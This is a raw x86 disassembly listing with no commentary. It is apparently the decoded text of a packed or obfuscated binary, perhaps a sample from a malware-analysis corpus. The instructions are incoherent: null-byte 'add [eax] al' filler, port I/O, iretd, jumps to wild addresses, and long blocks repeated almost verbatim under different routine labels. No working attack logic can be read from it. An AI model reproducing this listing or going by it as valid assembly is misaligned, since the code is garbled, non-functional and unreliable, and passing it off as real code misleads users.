mov ebx 0x812d775a
jge r-xdata
call [ 0xffffffffca81677d ]
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
push ecx
push edx
push ebp
sub esp 0x4
call sub_402c67
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b39c
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1ea2b
jne r-xdata
or edx 0xf3812e79
push ebp
pushfd
call sub_402ca4
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
add ecx 0xaa890f
add [ eax ] al
jg r-xdata
xor esi 0x25ffca77
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffca53a
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16a8a
jge 0x71fc6ba3
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
add [ ecx + 0x42850fe2 ] 0xffffffff
pushfd
push esi
call sub_402c9b
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402db5
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
inc ecx
xor eax [ eax ]
add esp 0x4
ja r-xdata
jl 0xffffffffffacbcc8
jae r-xdata
ja 0xffffffffa3c33c60
jae r-xdata
ja 0xffffffff89a46901
ja r-xdata
xor ebx 0xff3d870f
call sub_402c17
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdeb246
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
pop edx
pop edx
jae r-xdata
jmp 0xffffffffff79ad5e
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403035
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jg r-xdata
add eax 0x5abb2979
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff936be
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_402cc7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f27a
jg r-xdata
ja 0xcab076
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44f4a9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f180
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9baf1d
pop edx
jge r-xdata
jo 0xffffffff854f876f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f235
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcff74
jae r-xdata
call sub_402e2c
jb 0xffffffff81b2aae2
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa290
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0b2b3
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd3eb7
add esp 0x4
jae r-xdata
jl 0xf3aff8
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402cd2
jae 0xffffffffff43b4f7
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f86f1
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe891818e
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158b252
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662447
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428a76d
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
jo 0xffffffffa2c13e0f
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
jae r-xdata
je 0xffffffffff6db33f
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402f74
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b47f
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402cc7
add esp 0x4
jae r-xdata
push ecx
push ebx
push ecx
call sub_402dc4
xor ebx 0xff1a830f
jo 0x5596842a
call sub_402db5
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c33c60
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9baf1d
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f180
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeb246
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_402e2c
jb 0xffffffff81b2aae2
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff936be
add esp 0x4
jae r-xdata
jl 0xf3aff8
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f27a
jg r-xdata
ja 0xcab076
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f86f1
pop edx
jge r-xdata
jo 0xffffffff854f876f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f235
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe891818e
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa290
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacbcc8
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
inc ecx
xor eax [ eax ]
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428a76d
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402cd2
jae 0xffffffffff43b4f7
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6db33f
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403035
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_402cc7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b252
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44f4a9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffcff74
jno r-xdata
jge 0xffffffffffa0b2b3
jge r-xdata
jpe 0x74cd3eb7
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662447
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
jo 0xffffffffa2c13e0f
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402f74
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b47f
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402cd2
push esp
push edi
push esi
push ebp
call sub_402db5
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c33c60
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9baf1d
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f180
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeb246
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_402e2c
jb 0xffffffff81b2aae2
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff936be
add esp 0x4
jae r-xdata
jl 0xf3aff8
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f27a
jg r-xdata
ja 0xcab076
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f86f1
pop edx
jge r-xdata
jo 0xffffffff854f876f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f235
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe891818e
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa290
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacbcc8
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
inc ecx
xor eax [ eax ]
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428a76d
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402cd2
jae 0xffffffffff43b4f7
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6db33f
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403035
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_402cc7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b252
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44f4a9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffcff74
jno r-xdata
jge 0xffffffffffa0b2b3
jge r-xdata
jpe 0x74cd3eb7
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662447
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
jo 0xffffffffa2c13e0f
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402f74
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b47f
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402db5
jg r-xdata
jne r-xdata
and eax 0xae830f
add [ eax ] al
jae r-xdata
and esi 0x89641273
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f180
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeb246
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_402e2c
jb 0xffffffff81b2aae2
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
xor al [ ecx ]
add [ eax ] al
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff936be
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f27a
jg r-xdata
ja 0xcab076
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop edx
jge r-xdata
jo 0xffffffff854f876f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f235
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa290
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c33c60
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacbcc8
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
inc ecx
xor eax [ eax ]
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402cd2
jae 0xffffffffff43b4f7
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
or esi 0xff24810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403035
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_402cc7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b252
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jg r-xdata
ja 0xffffffffff9baf1d
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44f4a9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jno r-xdata
and ebx 0x870f4975
pop ecx
jne r-xdata
jbe 0xffcff74
jae r-xdata
xor esi 0xe681cd75
jno r-xdata
jge 0xffffffffffa0b2b3
add esp 0x4
jae r-xdata
jl 0xf3aff8
jge r-xdata
jpe 0x74cd3eb7
pop eax
jg r-xdata
jge 0xffffffff894f86f1
add [ eax ] al
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe891818e
push 0x81ffffff
out 0x77 al
jne r-xdata
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428a76d
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662447
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6db33f
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
jo 0xffffffffa2c13e0f
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
